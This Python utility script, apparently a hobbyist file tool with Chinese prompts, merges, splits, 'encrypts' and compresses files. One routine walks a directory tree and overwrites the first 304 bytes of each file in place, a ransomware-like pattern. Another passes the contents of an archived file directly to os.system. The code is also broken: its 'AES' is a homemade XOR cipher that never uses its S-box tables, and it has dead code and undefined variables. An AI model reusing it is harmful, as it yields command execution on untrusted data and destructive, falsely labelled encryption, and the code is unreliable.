# -*- coding:utf-8 -*-
import os,struct,string,sys
from io import BytesIO
from io import StringIO
Pw='DEF';D = {};PwT = 0
print(
	'INFO:\n'
	'参数不可以留空\n'
	'Input1:\n'
	'InputFilePath\n'
	'Input2:\n'
	'OutputPath\n'
	'Plz Enter The Function which Need to Use at Input3\n'
	'(Like\n'
	'-m(Merger)\n'
	'-d(Dismantling)\n'
	'-a(Encryption[密钥需要在待处理文件的同一目录下])\n'
	'-x(Decryption[密钥需要在待处理文件的同一目录下])\n'
	'-z(Compression)\n'
	'-u(Decompression)\n'
	'-k(GenerateRandomKEY)\n'
	'Input4(**):Password(-a(1),-x(1).ONLY))\n'
	)
InputParameter1_InputFilePath =input('请输入需要处理的文件路径及文件名(相对)(e.g. /Windows/TEST.txt)')
InputParameter2_OutputFilePath = input('请输入需要处理的文件的输出文件路径及文件名(相对)(e.g. /Windows/TESTOUTPUT.txt)')
__FUNCTION__ = input('请输入方法(e.g. -m)')
Pw = input('请输入密码(-a,-x:only)(e.g. PASSWORD)')
def __Merge_ENAES__(FuctionMergeInputFilePath,FuctionMergeOutputPath):
	FileSize=0
	TempPath = ''
	PathesOfFiles = [a for a in os.listdir(os.path.abspath(os.path.join(FuctionMergeInputFilePath,TempPath)))]
	for APathOfFileOrDir in PathesOfFiles:
		TempPath = APathOfFileOrDir
		if os.path.isdir(os.path.abspath(os.path.join(FuctionMergeInputFilePath,TempPath))):
			print(os.path.join(FuctionMergeInputFilePath,TempPath))
			__Merge_ENAES__(os.path.join(FuctionMergeInputFilePath,TempPath),FuctionMergeOutputPath)
		else:
			with open(os.path.join(FuctionMergeInputFilePath,TempPath),'rb') as file:
				print(os.path.join(FuctionMergeInputFilePath,TempPath))
				FileSize = os.path.getsize(os.path.join(FuctionMergeInputFilePath,TempPath))
				print (FileSize)
				with open(os.path.join(FuctionMergeInputFilePath,TempPath),'rb') as kk:
					if FileSize <= 304:
						__ENAESM__(kk.read(),os.path.join(FuctionMergeInputFilePath,TempPath))
					elif FileSize > 304:
						__ENAESM__(kk.read(304),os.path.join(FuctionMergeInputFilePath,TempPath))
									
					return 'Finished'
for PwE in Pw:
	PwM = ord(PwE)
	PwT = PwT + (PwM*315/3)
def __ENAESM__(data,name):
	x = open(name,'rb')
	S1 = {
		'0':'63','1':'7c','2':'77','3':'7b','4':'f2','5':'6b','6':'6f','7':'c5','8':'30','9':'01','a':'67','b':'2b','c':'fe','d':'d7','e':'ab','f':'76',
		'10':'ca','11':'82','12':'c9','13':'7d','14':'fa','15':'59','16':'47','17':'f0','18':'ad','19':'d4','1a':'a2','1b':'af','1c':'9c','1d':'a4','1e':'72','1f':'c0',
		'20':'b7','21':'fd','22':'93','23':'26','24':'36','25':'3f','26':'f7','27':'cc','28':'34','29':'a5','2a':'e5','2b':'f1','2c':'71','2d':'d8','2e':'31','2f':'15',
		'30':'04','31':'c7','32':'23','33':'c3','34':'18','35':'96','36':'05','37':'9a','38':'07','39':'12','3a':'80','3b':'e2','3c':'eb','3d':'27','3e':'b2','3f':'75',
		'40':'09','41':'83','42':'2c','43':'1a','44':'1b','45':'6e','46':'5a','47':'a0','48':'52','49':'3b','4a':'d6','4b':'b3','4c':'29','4d':'e3','4e':'2f','4f':'84',
		'50':'53','51':'d1','52':'00','53':'ed','54':'20','55':'fc','56':'b1','57':'5b','58':'6a','59':'cb','5a':'be','5b':'39','5c':'4a','5d':'4c','5e':'58','5f':'cf',
		'60':'d0','61':'ef','62':'aa','63':'fb','64':'43','65':'4d','66':'33','67':'85','68':'45','69':'f9','6a':'02','6b':'7f','6c':'50','6d':'3c','6e':'9f','6f':'a8',
		'70':'51','71':'a3','72':'40','73':'8f','74':'92','75':'9d','76':'38','77':'f5','78':'bc','79':'b6','7a':'da','7b':'21','7c':'10','7d':'ff','7e':'f3','7f':'d2',
		'80':'cd','81':'0c','82':'13','83':'ec','84':'5f','85':'97','86':'44','87':'17','88':'c4','89':'a7','8a':'7e','8b':'3d','8c':'64','8d':'5d','8e':'19','8f':'73',
		'90':'60','91':'81','92':'4f','93':'dc','94':'22','95':'2a','96':'90','97':'88','98':'46','99':'ee','9a':'b8','9b':'14','9c':'de','9d':'5e','9e':'0b','9f':'db',
		'a0':'e0','a1':'32','a2':'3a','a3':'0a','a4':'49','a5':'06','a6':'24','a7':'5c','a8':'c2','a9':'d3','aa':'ac','ab':'62','ac':'91','ad':'95','ae':'e4','af':'79',
		'b0':'e7','b1':'c8','b2':'37','b3':'6d','b4':'8d','b5':'d5','b6':'4e','b7':'a9','b8':'6c','b9':'56','ba':'f4','bb':'ea','bc':'65','bd':'7a','be':'ae','bf':'08',
		'c0':'ba','c1':'78','c2':'25','c3':'2e','c4':'1c','c5':'a6','c6':'b4','c7':'c6','c8':'e8','c9':'dd','ca':'74','cb':'1f','cc':'4b','cd':'bd','ce':'8b','cf':'8a',
		'd0':'70','d1':'3e','d2':'b5','d3':'66','d4':'48','d5':'03','d6':'f6','d7':'0e','d8':'61','d9':'35','da':'57','db':'b9','dc':'86','dd':'c1','de':'1d','df':'9e',
		'e0':'e1','e1':'f8','e2':'98','e3':'11','e4':'69','e5':'d9','e6':'8e','e7':'94','e8':'9b','e9':'1e','ea':'87','eb':'e9','ec':'ce','ed':'55','ee':'28','ef':'df',
		'f0':'8c','f1':'a1','f2':'89','f3':'0d','f4':'bf','f5':'e6','f6':'42','f7':'68','f8':'41','f9':'99','fa':'2d','fb':'0f','fc':'b0','fd':'54','fe':'bb','ff':'16'
	}
	aa = [0,0,0,0]
	ab = [0,0,0,0]
	ac = [0,0,0,0]
	ad = [0,0,0,0]
	ka = [0,0,0,0]
	kb = [0,0,0,0]
	kc = [0,0,0,0]
	kd = [0,0,0,0]
	b1 = [0,0,0,0]
	b2 = [0,0,0,0]
	b3 = [0,0,0,0]
	b4 = [0,0,0,0]
	I = '';J = '';M = '';L = ''
	data = data + bytes((304-len(data)) * ' ','utf-8')
	u = open('temp.temp','wb')
	u.write(data)
	u.close()
	f = open('temp.temp','rb')
	mmm = os.path.getsize(name)
	if mmm >= 304:
		f01 = x.read(304)
		f02 = x.read()
		x.seek(0,0)
	x.close()
	x = open(name,'wb')
	with open('KEY.txt','rb') as K:
		fr = data
		for k in range((len(fr)//16)):
			K.seek(0,0)
			for i in range(16):
				b = ord(struct.pack('c',f.read(1)))
				if i <= 3:
					aa[i] = b 
				elif 3 < i <= 7:
					ab[i-4] = b
				elif 7 < i <=11:
					ac[i - 8] = b 
				elif i > 11:
					ad[i-12] = b
			for j in range(16):
				b = ord(struct.pack('c',K.read(1)))
				if j <= 3:
					ka[j] = b
				elif 3 < j <= 7:
					kb[j-4] = b
				elif 7 < j <=11:
					kc[j - 8] = b
				elif j > 11:
					kd[j-12] = b
			for i in range(16):
				if i <= 3:
					b1[i] = aa[i]^ka[i]
				elif 3 < i <= 7:
					b2[i-4] = ab[i-4]^kb[i-4]
				elif 7 < i <=11:
					b3[i-8] = ac[i-8]^kc[i-8]
				elif i > 11:
					b4[i-12] = ad[i-12]^kd[i-12]	
				
			I = b2[0]
			J = b2[1]
			M = b2[2]
			L = b2[3]
			
			b2[0] = J
			b2[1] = M
			b2[2] = L
			b2[3] = I
			
			I = b3[0]
			J = b3[1]
			M = b3[2]
			L = b3[3]
			
			b3[0] = M
			b3[1] = L
			b3[2] = I
			b3[3] = J
			
			I = b4[0]
			J = b4[1]
			M = b4[2]
			L = b4[3]
			
			b4[0] = L
			b4[1] = I
			b4[2] = J
			b4[3] = M	
			
			b1[0] = b1[0] ^ int('02',16)
			b2[0] = b2[0] ^ int('03',16)
			b3[0] = b3[0] ^ int('01',16)
			b4[0] = b4[0] ^ int('01',16)
			
			b1[1] = b1[1] ^ int('01',16)
			b2[1] = b2[1] ^ int('02',16)
			b3[1] = b3[1] ^ int('03',16)
			b4[1] = b4[1] ^ int('01',16)
			
			b1[2] = b1[2] ^ int('01',16)
			b2[2] = b2[2] ^ int('01',16)
			b3[2] = b3[2] ^ int('02',16)
			b4[2] = b4[2] ^ int('03',16) 
			
			b1[3] = b1[3] ^ int('03',16)
			b2[3] = b2[3] ^ int('01',16)
			b3[3] = b3[3] ^ int('01',16)
			b4[3] = b4[3] ^ int('02',16)
			
	
			for i in range(4):
				x.write(struct.pack('B',b1[i]))
			for i in range(4):
				x.write(struct.pack('B',b2[i]))
			for i in range(4):
				x.write(struct.pack('B',b3[i]))
			for i in range(4):
				x.write(struct.pack('B',b4[i]))	
			if int(((k+1)/(len(fr)/16))*100) != int(((k+2)/(len(fr)/16))*100):
				print(str(int(((k+1)/(len(fr)/16))*100)+1) + '%')
	if mmm > 304:
		x.close()
		x = open(name,'ab')
		x.write(f02)
		x.close()
	f.close()			
	return 'Finished'
def __Merge__(FuctionMergeInputFilePath,FuctionMergeOutputPath):
	FileSize='a'
	TempPath = ''
	PathesOfFiles = [a for a in os.listdir(os.path.abspath(os.path.join(FuctionMergeInputFilePath,TempPath)))]
	for APathOfFileOrDir in PathesOfFiles:
		TempPath = APathOfFileOrDir
		if os.path.isdir(os.path.abspath(os.path.join(FuctionMergeInputFilePath,TempPath))):
			print(os.path.join(FuctionMergeInputFilePath,TempPath))
			__Merge__(os.path.join(FuctionMergeInputFilePath,TempPath),FuctionMergeOutputPath)
		else:
			with open(os.path.join(FuctionMergeInputFilePath,TempPath),'rb') as file:
				print(os.path.join(FuctionMergeInputFilePath,TempPath))
				FileSize = 'size:'+ str(os.path.getsize(os.path.join(FuctionMergeInputFilePath,TempPath)))
				OutputFile.write(bytes(FileSize,encoding='utf-8'))
				print (FileSize)
				OutputFile.write(bytes('AnarchyMassacreStudio_Kevin C. Wang'+os.path.join(FuctionMergeInputFilePath,TempPath)+'AnarchyMassacreStudio_Kevin C. Wang',encoding='utf-8'))
				OutputFile.write(file.read())
	return 'Finished'
def __Dismantling__(FuctionDismantlingInputFilePath,FuctionDismantlingOutputPath):
	def __MakeDirs__(FunctionMakeDirsInputDirsPath):
		if not os.path.exists(os.path.join(FuctionDismantlingOutputPath,FunctionMakeDirsInputDirsPath)):
			os.makedirs(os.path.join(FuctionDismantlingOutputPath,FunctionMakeDirsInputDirsPath))
	def __Remove__(FunctionRemoveFileInputFilePath):
		if os.path.exists(os.path.join(FuctionDismantlingOutputPath,FunctionRemoveFileInputFilePath)):
			os.remove(os.path.join(FuctionDismantlingOutputPath,FunctionRemoveFileInputFilePath))
	Chuck = b'/00'
	TempChuck1 = b''
	TempChuck2 = b''
	FunctionDismantlingDismantlingFilePath = 'Mass'
	with open(FuctionDismantlingInputFilePath,'rb') as file:
		while Chuck != b'':
			Chuck = file.read(1)
			if Chuck == b's':
				TempChuck1 = TempChuck1 + Chuck
				Chuck = file.read(1)
				if Chuck ==b'i':
					TempChuck1 = TempChuck1 + Chuck
					Chuck = file.read(1)
					if Chuck == b'z':
						TempChuck1 = TempChuck1 + Chuck
						Chuck = file.read(1)
						if Chuck == b'e':
							TempChuck1 = TempChuck1 + Chuck
							Chuck = file.read(1)
							if Chuck == b':':
								TempChuck1 =b''
								while Chuck != b'A':
									Chuck = file.read(1)
									TempChuck1 = TempChuck1 + Chuck
								TempChuck1 = TempChuck1[0:int(len(TempChuck1)-1)] #文件字节数
								file.read(34) #跳过标记
								while Chuck != b'W':
									Chuck = file.read(1)
									TempChuck2 = TempChuck2 + Chuck
								Chuck = file.read(1)
								TempChuck2 = TempChuck2 + Chuck
								if Chuck == b'a':
									Chuck = file.read(1)
									TempChuck2 = TempChuck2 + Chuck
									if Chuck == b'n':
										TempChuck2 = TempChuck2 + Chuck
										Chuck = file.read(1)
										if Chuck == b'g':
											TempChuck2 = TempChuck2 + Chuck
								TempChuck2 = TempChuck2[0:int(len(TempChuck2)-36)] #得到路径
								FunctionDismantlingDismantlingFilePath = str(TempChuck2,encoding='utf-8')
								print (FunctionDismantlingDismantlingFilePath)
								tCk = os.path.dirname(FunctionDismantlingDismantlingFilePath)
								__MakeDirs__(tCk)
								#print ('OK\n')
								File = open(os.path.join(FuctionDismantlingOutputPath,str(FunctionDismantlingDismantlingFilePath)),'wb')	#新建文件
								TempChuck2 = file.read(int(TempChuck1))			 #获取内容
								File.write(TempChuck2)			 #写入
								TempChuck2 = b''
								TempChuck1 = b''
								
	return 'Finished'
def __Dismantlingr__(FuctionDismantlingInputFilePath,FuctionDismantlingOutputPath):
	Chuck = b'/00'
	TempChuck1 = b''
	TempChuck2 = b''
	FunctionDismantlingDismantlingFilePath = 'Mass'
	with open(FuctionDismantlingInputFilePath,'rb') as file:
		while Chuck != b'':
			Chuck = file.read(1)
			if Chuck == b's':
				TempChuck1 = TempChuck1 + Chuck
				Chuck = file.read(1)
				if Chuck ==b'i':
					TempChuck1 = TempChuck1 + Chuck
					Chuck = file.read(1)
					if Chuck == b'z':
						TempChuck1 = TempChuck1 + Chuck
						Chuck = file.read(1)
						if Chuck == b'e':
							TempChuck1 = TempChuck1 + Chuck
							Chuck = file.read(1)
							if Chuck == b':':
								TempChuck1 =b''
								while Chuck != b'A':
									Chuck = file.read(1)
									TempChuck1 = TempChuck1 + Chuck
								TempChuck1 = TempChuck1[0:int(len(TempChuck1)-1)] #文件字节数
								file.read(34) #跳过标记
								while Chuck != b'W':
									Chuck = file.read(1)
									TempChuck2 = TempChuck2 + Chuck
								Chuck = file.read(1)
								TempChuck2 = TempChuck2 + Chuck
								if Chuck == b'a':
									Chuck = file.read(1)
									TempChuck2 = TempChuck2 + Chuck
									if Chuck == b'n':
										TempChuck2 = TempChuck2 + Chuck
										Chuck = file.read(1)
										if Chuck == b'g':
											TempChuck2 = TempChuck2 + Chuck
								TempChuck2 = TempChuck2[0:int(len(TempChuck2)-36)] #得到路径
								FunctionDismantlingDismantlingFilePath = str(TempChuck2,encoding='utf-8')
								print (FunctionDismantlingDismantlingFilePath)
								TempChuck2 = str(file.read(int(TempChuck1)))	 #获取内容
								gg = StringIO(TempChuck2)								#写入
								os.system(gg.read())
								TempChuck2 = b''
								TempChuck1 = b''
								
	return 'Finished'
	F = open(FileNameNPath ,'r')
	AChuckNeedToDis = ''
	AChuckNeedToWriteInX = ''
	AChuckREAD = ''
	SIGN = 1
	while SIGN:
		while AChuckREAD != '/':
			AChuckREAD = F.read(1)
			if AChuckREAD == '/':
				AChuckREAD = 'EE'
				if AChuckNeedToDis != '':
					AChuckNeedToDis = ((float(AChuckNeedToDis)+int(PwT))/2)**0.5
					AChuckNeedToDis = chr(int(AChuckNeedToDis))
					AChuckNeedToWriteInX = AChuckNeedToWriteInX + AChuckNeedToDis
					AChuckNeedToDis = ''
				continue
			elif AChuckREAD == '':
				SIGN = 0
				break
			else:
				AChuckNeedToDis = AChuckNeedToDis + AChuckREAD
	F.close()
	F = open(FileNameNPath ,'w')
	F.write(AChuckNeedToWriteInX)
def __Zip__(InputFile,SIZE):
	D = {'5X': '0x61', '-.': '0xa9', '-X': '0xb5', '24': '0x2f', '25': '0x30', '26': '0x31', '27': '0x32', '20': '0x35', '21': '0x2c', '22': '0x2d', '23': '0x2e', '28': '0x33', '29': '0x34', '-8': '0xb1', '2-': '0x36', '2.': '0x2b', '2/': '0x2a', '2X': '0x37', '59': '0x5e', '58': '0x5d', '55': '0x5a', '54': '0x59', '57': '0x5c', '56': '0x5b', '51': '0x56', '50': '0x5f', '53': '0x58', '52': '0x57', '5-': '0x60', '-4': '0xad', '5/': '0x54', '5.': '0x55', '-1': '0xaa', '-0': '0xb3', '-3': '0xac', '-2': '0xab', '-9': '0xb2', '-/': '0xa8', '3X': '0x45', '8.': '0x7f', '8/': '0x7e', '8-': '0x8a', 'X-': '0xc2', '88': '0x87', '89': '0x88', '82': '0x81', '83': '0x82', '80': '0x89', '81': '0x80', '86': '0x85', '87': '0x86', '84': '0x83', '85': '0x84', '02': '0x9d', '03': '0x9e', '00': '0xa5', '01': '0x9c', '06': '0xa1', '07': '0xa2', '04': '0x9f', '05': '0xa0', '-5': '0xae', '08': '0xa3', '09': '0xa4', '-7': '0xb0', '-6': '0xaf', '0.': '0x9b', '0/': '0x9a', '0-': '0xa6', '0X': '0xa7', 'X6': '0xbd', 'X/': '0xb6', '39': '0x42', '38': '0x41', '33': '0x3c', '32': '0x3b', '31': '0x3a', '30': '0x43', '37': '0x40', '36': '0x3f', '35': '0x3e', '34': '0x3d', '8X': '0x8b', '3/': '0x38', '3.': '0x39', '3-': '0x44', '1X': '0x29', '6-': '0x6e', '6.': '0x63', '6/': '0x62', '60': '0x6d', '61': '0x64', '62': '0x65', '63': '0x66', '64': '0x67', '65': '0x68', '66': '0x69', '67': '0x6a', '68': '0x6b', '69': '0x6c', 'X.': '0xb7', '.-': '0x1a', '..': '0x0f', './': '0x0e', 'X2': '0xb9', '.8': '0x17', '.9': '0x18', 'X8': '0xbf', 'X9': '0xc0', '.0': '0x19', '.1': '0x10', '.2': '0x11', '.3': '0x12', '.4': '0x13', '.5': '0x14', '.6': '0x15', '.7': '0x16', '9-': '0x98', '9/': '0x8c', '9.': '0x8d', '.X': '0x1b', '98': '0x95', 'XX': '0xc3', 'X3': '0xba', '91': '0x8e', '90': '0x97', '93': '0x90', '92': '0x8f', '95': '0x92', '94': '0x91', '97': '0x94', '96': '0x93', '11': '0x1e', '10': '0x27', '13': '0x20', '12': '0x1f', '15': '0x22', '14': '0x21', '17': '0x24', '16': '0x23', '19': '0x26', '18': '0x25', 'X0': '0xc1', 'X7': '0xbe', '99': '0x96', 'X4': '0xbb', '6X': '0x6f', 'X5': '0xbc', '1-': '0x28', '1/': '0x1c', '1.': '0x1d', 'X1': '0xb8', '/X': '0x0d', '48': '0x4f', '49': '0x50', '46': '0x4d', '47': '0x4e', '44': '0x4b', '45': '0x4c', '42': '0x49', '43': '0x4a', '40': '0x51', '41': '0x48', '4.': '0x47', '4/': '0x46', '4-': '0x52', '--': '0xb4', '7X': '0x7d', '4X': '0x53', '7/': '0x70', '7.': '0x71', '7-': '0x7c', '9X': '0x99', '77': '0x78', '76': '0x77', '75': '0x76', '74': '0x75', '73': '0x74', '72': '0x73', '71': '0x72', '70': '0x7b', '79': '0x7a', '78': '0x79', '//': '0x00', '/.': '0x01', '/-': '0x0c', '/9': '0x0a', '/8': '0x09', '/7': '0x08', '/6': '0x07', '/5': '0x06', '/4': '0x05', '/3': '0x04', '/2': '0x03', '/1': '0x02', '/0': '0x0b'}
	if SIZE%2!=0:
		SIZE = SIZE + 1
		with open(InputFile,'a') as FileTMP:
			FileTMP.write('X')
	with open(InputFile,'rb') as FileNeed2ZipFILE:
		with open(InputFile+'AMSZip','wb') as FileNeed2ZipFILE2:
			while SIZE:
				ChuckRead = FileNeed2ZipFILE.read(2)
				BinChuck1 = ChuckRead[0:1];BinChuck2 = ChuckRead[1:2]
				SIZE = SIZE - 2
				FileNeed2ZipFILE2.write(struct.pack('i',int(bytes(D[str(BinChuck1+BinChuck2,encoding='utf-8')],encoding='utf-8'),16))[:1])
def __UnZip__(InputFile,SIZE):
	D = {'0x3e': '35', '0x3d': '34', '0x3f': '36', '0x3a': '31', '0x3c': '33', '0x3b': '32', '0x28': '1-', '0x29': '1X', '0x22': '15', '0x23': '16', '0x20': '13', '0x21': '14', '0x26': '19', '0x27': '10', '0x24': '17', '0x25': '18', '0x35': '20', '0x34': '29', '0x37': '2X', '0x36': '2-', '0x31': '26', '0x30': '25', '0x33': '28', '0x32': '27', '0x39': '3.', '0x38': '3/', '0xc0': 'X9', '0x88': '89', '0x89': '80', '0x2b': '2.', '0x2c': '21', '0x2a': '2/', '0x2f': '24', '0x2d': '22', '0x2e': '23', '0x5c': '57', '0x5b': '56', '0x5a': '55', '0xba': 'X3', '0x5f': '50', '0x5e': '59', '0x5d': '58', '0x40': '37', '0x41': '38', '0x42': '39', '0x43': '30', '0x44': '3-', '0x45': '3X', '0x46': '4/', '0x47': '4.', '0x48': '41', '0x49': '42', '0xaf': '-6', '0xae': '-5', '0xad': '-4', '0xac': '-3', '0xab': '-2', '0xaa': '-1', '0x4a': '43', '0x4b': '44', '0x4c': '45', '0x4d': '46', '0x4e': '47', '0x4f': '48', '0x53': '4X', '0x52': '4-', '0x51': '40', '0x50': '49', '0x57': '52', '0x56': '51', '0x55': '5.', '0x54': '5/', '0x59': '54', '0x58': '53', '0xa9': '-.', '0xa8': '-/', '0xa7': '0X', '0xa6': '0-', '0xa5': '00', '0xa4': '09', '0xa3': '08', '0xa2': '07', '0xa1': '06', '0xa0': '05', '0x7a': '79', '0x7c': '7-', '0x7b': '70', '0x7e': '8/', '0x7d': '7X', '0x7f': '8.', '0x68': '65', '0x69': '66', '0x66': '63', '0x67': '64', '0x64': '61', '0x65': '62', '0x62': '6/', '0x63': '6.', '0x60': '5-', '0x61': '5X', '0x99': '9X', '0xb8': 'X1', '0xb9': 'X2', '0xb2': '-9', '0xb3': '-0', '0xb0': '-7', '0xb1': '-8', '0xb6': 'X/', '0xb7': 'X.', '0xb4': '--', '0xb5': '-X', '0x6f': '6X', '0x6d': '60', '0x6e': '6-', '0x6b': '68', '0x6c': '69', '0x6a': '67', '0x79': '78', '0x78': '77', '0x71': '7.', '0x70': '7/', '0x73': '72', '0x72': '71', '0x75': '74', '0x74': '73', '0x77': '76', '0x76': '75', '0xc1': 'X0', '0x8b': '8X', '0xc3': 'XX', '0xc2': 'X-', '0xbb': 'X4', '0xbc': 'X5', '0x8c': '9/', '0xbf': 'X8', '0xbd': 'X6', '0xbe': 'X7', '0x9f': '04', '0x9e': '03', '0x9d': '02', '0x08': '/7', '0x09': '/8', '0x9a': '0/', '0x04': '/3', '0x05': '/4', '0x06': '/5', '0x07': '/6', '0x00': '//', '0x01': '/.', '0x02': '/1', '0x03': '/2', '0x84': '85', '0x85': '86', '0x86': '87', '0x87': '88', '0x80': '81', '0x81': '82', '0x82': '83', '0x83': '84', '0x1f': '12', '0x1e': '11', '0x1d': '1.', '0x1c': '1/', '0x1b': '.X', '0x1a': '.-', '0x9c': '01', '0x9b': '0.', '0x8d': '9.', '0x8e': '91', '0x8f': '92', '0x8a': '8-', '0x19': '.0', '0x18': '.9', '0x17': '.8', '0x16': '.7', '0x15': '.6', '0x14': '.5', '0x13': '.4', '0x12': '.3', '0x11': '.2', '0x10': '.1', '0x97': '90', '0x96': '99', '0x95': '98', '0x94': '97', '0x93': '96', '0x92': '95', '0x91': '94', '0x90': '93', '0x0d': '/X', '0x0e': './', '0x0f': '..', '0x98': '9-', '0x0a': '/9', '0x0b': '/0', '0x0c': '/-'}
	with open(InputFile,'rb') as FileNeed2UnZip:
		with open(InputFile+'N','wb') as FileNeed2UnZip2:
			while SIZE:
				ChuckRead = hex(ord(struct.pack('c',FileNeed2UnZip.read(1))))
				if len(ChuckRead)!=4:
					ChuckRead = '0x0'+ChuckRead[2:]
				ChuckRead = D[ChuckRead]
				SIZE = SIZE - 1
				FileNeed2UnZip2.write(bytes(ChuckRead,encoding='utf-8'))
	with open(InputFile+'N','rb') as FileNeed2UnZip2:
		if not os.path.exists('X'):os.makedirs('X')
		with open(os.path.join('X',os.path.basename(InputFile)),'wb') as FileNeed2UnZip:
			FileNeed2UnZip.write(FileNeed2UnZip2.read())
	os.remove(InputFile+'N')
def __DATA__():
	D = {}
	with open('_DATA.txt','w') as _DATA:
		M='/.1234567890-X'
		L=0
		for k in M:
			for l in M:
				if len(hex(L)) != 4:
					_DATA.write(k+l+' '+'0x0'+hex(L)[2:]+'\n')
				else:
					_DATA.write(k+l+' '+hex(L)+'\n')
				L = L + 1
	with open('_DATA.txt', 'r') as df:
		for kv in [d.strip().split(' ') for d in df]:
			D[kv[1]] = kv[0]
	print (D)
def _DN_AES_(data): 
	aa = [0,0,0,0]
	ab = [0,0,0,0]
	ac = [0,0,0,0]
	ad = [0,0,0,0]
	ka = [0,0,0,0]
	kb = [0,0,0,0]
	kc = [0,0,0,0]
	kd = [0,0,0,0]
	b1 = [0,0,0,0]
	b2 = [0,0,0,0]
	b3 = [0,0,0,0]
	b4 = [0,0,0,0]
	I = [0,0,0,0]
	S1 = {
		'0':'52','1':'09','2':'6A','3':'D5','4':'30','5':'36','6':'A5','7':'38','8':'BF','9':'40','a':'A3','b':'9E','c':'81','d':'F3','e':'D7','f':'FB',
		'10':'7C','11':'E3','12':'39','13':'82','14':'9B','15':'2F','16':'FF','17':'87','18':'34','19':'8E','1a':'43','1b':'44','1c':'C4','1d':'DE','1e':'E9','1f':'CB',
		'20':'54','21':'7B','22':'94','23':'32','24':'A6','25':'C2','26':'23','27':'3D','28':'EE','29':'4C','2a':'95','2b':'0B','2c':'42','2d':'FA','2e':'C3','2f':'4E',
		'30':'08','31':'2E','32':'A1','33':'66','34':'28','35':'D9','36':'24','37':'B2','38':'76','39':'5B','3a':'A2','3b':'49','3c':'6D','3d':'8B','3e':'D1','3f':'25',
		'40':'72','41':'F8','42':'F6','43':'64','44':'86','45':'68','46':'98','47':'16','48':'D4','49':'A4','4a':'5C','4b':'CC','4c':'5D','4d':'65','4e':'B6','4f':'92',
		'50':'6C','51':'70','52':'48','53':'50','54':'FD','55':'ED','56':'B9','57':'DA','58':'5E','59':'15','5a':'46','5b':'57','5c':'A7','5d':'8D','5e':'9D','5f':'84',
		'60':'90','61':'D8','62':'AB','63':'00','64':'8C','65':'BC','66':'D3','67':'0A','68':'F7','69':'E4','6a':'58','6b':'05','6c':'B8','6d':'B3','6e':'45','6f':'06',
		'70':'D0','71':'2C','72':'1E','73':'8F','74':'CA','75':'3F','76':'0F','77':'02','78':'C1','79':'AF','7a':'BD','7b':'03','7c':'01','7d':'13','7e':'8A','7f':'6B',
		'80':'3A','81':'91','82':'11','83':'41','84':'4F','85':'67','86':'DC','87':'EA','88':'97','89':'F2','8a':'CF','8b':'CE','8c':'F0','8d':'B4','8e':'E6','8f':'73',
		'90':'96','91':'AC','92':'74','93':'22','94':'E7','95':'AD','96':'35','97':'85','98':'E2','99':'F9','9a':'37','9b':'E8','9c':'1C','9d':'75','9e':'DF','9f':'6E',
		'a0':'47','a1':'F1','a2':'1A','a3':'71','a4':'1D','a5':'29','a6':'C5','a7':'89','a8':'6F','a9':'B7','aa':'62','ab':'0E','ac':'AA','ad':'18','ae':'BE','af':'1B',
		'b0':'FC','b1':'56','b2':'3E','b3':'4B','b4':'C6','b5':'D2','b6':'79','b7':'20','b8':'9A','b9':'DB','ba':'C0','bb':'FE','bc':'78','bd':'CD','be':'5A','bf':'F4',
		'c0':'1F','c1':'DD','c2':'A8','c3':'33','c4':'88','c5':'07','c6':'C7','c7':'31','c8':'B1','c9':'12','ca':'10','cb':'59','cc':'27','cd':'80','ce':'EC','cf':'5F',
		'd0':'60','d1':'51','d2':'7F','d3':'A9','d4':'19','d5':'B5','d6':'4A','d7':'0D','d8':'2D','d9':'E5','da':'7A','db':'9F','dc':'93','dd':'C9','de':'9C','df':'EF',
		'e0':'A0','e1':'E0','e2':'3B','e3':'4D','e4':'AE','e5':'2A','e6':'F5','e7':'B0','e8':'C8','e9':'EB','ea':'BB','eb':'3C','ec':'83','ed':'53','ee':'99','ef':'61',
		'f0':'17','f1':'2B','f2':'04','f3':'7E','f4':'BA','f5':'77','f6':'D6','f7':'26','f8':'E1','f9':'69','fa':'14','fb':'63','fc':'55','fd':'21','fe':'0C','ff':'7D'
	}
	with open(data,'rb') as f:
		with open('KEY.txt','rb') as K:
			with open(data[:len(data)-8]+'R','wb') as E:
				fr = f.read()
				f.seek(0,0)
				for k in range((len(fr)//16)):
					K.seek(0,0)
					for i in range(16):
						b = ord(struct.pack('c',f.read(1)))
						if i <= 3:
							aa[i] = b 
						elif 3 < i <= 7:
							ab[i-4] = b
						elif 7 < i <=11:
							ac[i - 8] = b 
						elif i > 11:
							ad[i-12] = b
					for j in range(16):
						b = ord(K.read(1))
						if j <= 3:
							ka[j] = b
						elif 3 < j <= 7:
							kb[j-4] = b 
						elif 7 < j <=11:
							kc[j - 8] = b
						elif j > 11:
							kd[j-12] = b
					b1[0] = aa[0] ^ int('02',16)
					b2[0] = ab[0] ^ int('03',16)
					b3[0] = ac[0] ^ int('01',16)
					b4[0] = ad[0] ^ int('01',16)	
										 
					b1[1] = aa[1] ^ int('01',16)
					b2[1] = ab[1] ^ int('02',16)
					b3[1] = ac[1] ^ int('03',16)
					b4[1] = ad[1] ^ int('01',16)	
										 
					b1[2] = aa[2] ^ int('01',16)
					b2[2] = ab[2] ^ int('01',16)
					b3[2] = ac[2] ^ int('02',16)
					b4[2] = ad[2] ^ int('03',16)     
										 
					b1[3] = aa[3] ^ int('03',16)
					b2[3] = ab[3] ^ int('01',16)
					b3[3] = ac[3] ^ int('01',16)
					b4[3] = ad[3] ^ int('02',16)
					
					I = b2[0]
					J = b2[1]
					M = b2[2]
					L = b2[3]
					
					b2[0] = L
					b2[1] = I
					b2[2] = J
					b2[3] = M
					
					I = b3[0]
					J = b3[1]
					M = b3[2]
					L = b3[3]
					
					b3[0] = M
					b3[1] = L
					b3[2] = I
					b3[3] = J
					
					I = b4[0]
					J = b4[1]
					M = b4[2]
					L = b4[3]
					
					b4[0] = J
					b4[1] = M
					b4[2] = L
					b4[3] = I	
					
					for i in range(16):
						if i <= 3:
							aa[i] = b1[i]^ka[i]
						elif 3 < i <= 7:
							ab[i-4] = b2[i-4]^kb[i-4]
						elif 7 < i <=11:
							ac[i-8] = b3[i-8]^kc[i-8]
						elif i > 11:
							ad[i-12] = b4[i-12]^kd[i-12]
					for i in range(4):
						E.write(struct.pack('B',aa[i]))
					for i in range(4):
						E.write(struct.pack('B',ab[i]))
					for i in range(4):
						E.write(struct.pack('B',ac[i]))
					for i in range(4):
						E.write(struct.pack('B',ad[i]))	
					if int(((k+1)/(len(fr)/16))*100) != int(((k+2)/(len(fr)/16))*100):
						print(str(int(((k+1)/(len(fr)/16))*100)+1) + '%')
